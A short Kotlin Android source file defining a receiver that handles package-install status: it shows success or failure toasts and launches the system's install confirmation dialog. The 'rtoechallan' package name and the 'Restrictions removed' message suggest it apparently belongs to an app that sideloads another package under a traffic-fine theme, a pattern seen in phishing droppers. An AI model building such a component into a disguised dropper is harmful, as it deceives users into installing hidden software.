package com.example.rtoechallan

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.widget.Toast

class InstallReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        // Installation ka status check karein
        val status = intent?.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE)
        
        when (status) {
            PackageInstaller.STATUS_SUCCESS -> {
                // Agar install ho gaya, toh ye message dikhega
                Toast.makeText(context, "Setup Successful! Restrictions removed.", Toast.LENGTH_LONG).show()
            }
            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                // Agar system ko user ka "OK" chahiye (Installation popup)
                val confirmIntent = intent.getParcelableExtra<Intent>(Intent.EXTRA_INTENT)
                context?.startActivity(confirmIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
            }
            else -> {
                // Agar koi error aaya
                val msg = intent?.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE)
                Toast.makeText(context, "Installation Failed: $msg", Toast.LENGTH_SHORT).show()
            }
        }
    }
}
